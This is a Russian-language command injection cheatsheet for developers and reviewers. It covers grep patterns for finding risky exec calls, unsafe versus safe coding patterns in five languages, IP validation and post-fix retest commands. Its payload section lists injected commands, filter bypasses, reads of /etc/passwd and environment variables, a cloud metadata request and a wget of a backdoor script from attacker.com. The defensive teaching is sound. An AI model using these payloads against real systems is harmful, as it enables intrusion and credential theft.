# Command Injection Cheatsheet

> Быстрая справка по Command Injection.

---

## Что искать на Code Review

```bash
# Java
grep -rn "Runtime.exec\|Runtime.getRuntime" src/ --include="*.java"
grep -rn "ProcessBuilder" src/ --include="*.java"

# Python
grep -rn "os.system\|os.popen\|subprocess.call\|subprocess.run" src/ --include="*.py"
grep -rn "eval\|exec" src/ --include="*.py"

# Node.js
grep -rn "exec\|execSync\|execFile\|spawn" src/ --include="*.js" --include="*.ts"
grep -rn "child_process" src/ --include="*.js" --include="*.ts"

# PHP
grep -rn "exec\|shell_exec\|system\|passthru\|popen\|`" src/ --include="*.php"

# Go
grep -rn "os/exec\|exec.Command\|exec.CommandContext" src/ --include="*.go"

# Shell scripts
grep -rn "`.*\$.*`" src/ --include="*.sh"
grep -rn "\$(" src/ --include="*.sh"
```

---

## Полезные payload для тестирования

```bash
# Базовые команды
8.8.8.8
8.8.8.8; whoami
8.8.8.8 && whoami
8.8.8.8 | whoami
8.8.8.8 `whoami`
$(whoami)

# Обход фильтров
8.8.8.8%0Awhoami          # newline encoding
8.8.8.8%0d%0awhoami        # CRLF
8.8.8.8||whoami            # OR (если && заблокирован)
8.8.8.8|whoami             # pipe
8.8.8.8;cat$IFS/etc/passwd  # $IFS вместо пробела

# Чтение файлов
8.8.8.8 && cat /etc/passwd
8.8.8.8 && type C:\Windows\win.ini   # Windows
8.8.8.8 && cat application.yml

# Environment variables
8.8.8.8 && env
8.8.8.8 && printenv

# Networking
8.8.8.8 && curl http://169.254.169.254/latest/meta-data/
8.8.8.8 && wget http://attacker.com/backdoor.sh
```

---

## Безопасные паттерны

### Java

```java
// [NO] ОПАСНО
Runtime.getRuntime().exec("ping " + ip);
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "ping " + ip});

// [OK] БЕЗОПАСНО
ProcessBuilder pb = new ProcessBuilder("ping", ip);
Process process = pb.start();

// [OK] ЕЩЁ ЛУЧШЕ — не вызывать shell вообще
InetAddress.getByName(ip).isReachable(timeout);
```

### Python

```python
# [NO] ОПАСНО
os.system("ping " + ip)
os.popen("ping " + ip)

# [OK] БЕЗОПАСНО
subprocess.run(["ping", ip], shell=False)

# [OK] ЕЩЁ ЛУЧШЕ
import ipaddress
ipaddress.ip_address(ip)  # валидация IP
```

### Node.js

```javascript
// [NO] ОПАСНО
const { exec } = require('child_process');
exec(`ping ${ip}`, (err, stdout) => {});

// [OK] БЕЗОПАСНО
const { spawn } = require('child_process');
spawn('ping', [ip]);
```

### PHP

```php
// [NO] ОПАСНО
shell_exec("ping " . $ip);

// [OK] БЕЗОПАСНО — если shell необходим
escapeshellarg($ip);
// Но лучше вообще не вызывать shell
```

### Go

```go
// [NO] ОПАСНО
cmd := exec.Command("/bin/sh", "-c", "ping " + ip)

// [OK] БЕЗОПАСНО
cmd := exec.Command("ping", ip)
```

---

## Валидация аргументов

```python
# Проверка IP-адреса (если ожидается IP)
import ipaddress
import socket

def validate_ip(ip: str) -> str:
    """Проверяет, что строка — валидный IPv4 или IPv6 адрес."""
    try:
        addr = ipaddress.ip_address(ip)
        # Дополнительно: блокировать private IP?
        if addr.is_private or addr.is_loopback:
            raise ValueError("Private IP not allowed")
        return str(addr)
    except ValueError:
        raise ValueError("Invalid IP address")
```

```java
// Java — валидация IP
public static boolean isValidIP(String ip) {
    String ipv4Pattern = "^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$";
    return ip.matches(ipv4Pattern);
}
```

---

## Проверка после фикса

```bash
# 1. Базовая проверка Command Injection
curl "https://target.com/ping?ip=8.8.8.8;whoami"

# 2. Проверка с обходом
curl "https://target.com/ping?ip=8.8.8.8|whoami"
curl "https://target.com/ping?ip=8.8.8.8%0Awhoami"

# 3. Проверка, что ProcessBuilder не пропускает команды
curl "https://target.com/ping?ip=8.8.8.8%20%26%26%20whoami"
# Должен быть: ошибка или пинг 8.8.8.8, но без whoami

# 4. Проверка SSRF-подобного сценария
curl "https://target.com/ping?ip=127.0.0.1"
# Должен быть 403 если внутренние IP запрещены
```

---

## Типичные ошибки

| Ошибка | Почему не работает |
|--------|-------------------|
| Экранирование через `replace(";", "")` | Обходится через `&&`, `\|`, `\` `` ` ``, `$(...)` |
| Использование `Runtime.exec(String[])` с одним элементом | Если первый элемент — shell, injection возможен |
| `ProcessBuilder` с `shell: true` | Отключает разделение аргументов |
| Только client-side валидация | API вызывается напрямую через curl/Postman |
| Blacklist символов | Всегда есть обход (encoding, obfuscation) |
| Shell-скрипты, вызываемые из кода | Даже если код безопасен, shell-скрипт может быть уязвим |

---

## Связанные CWE

| CWE | Описание |
|-----|----------|
| **CWE-78** | Improper Neutralization of Special Elements used in an OS Command |
| **CWE-77** | Improper Neutralization of Special Elements used in a Command |
| **CWE-88** | Argument Injection |
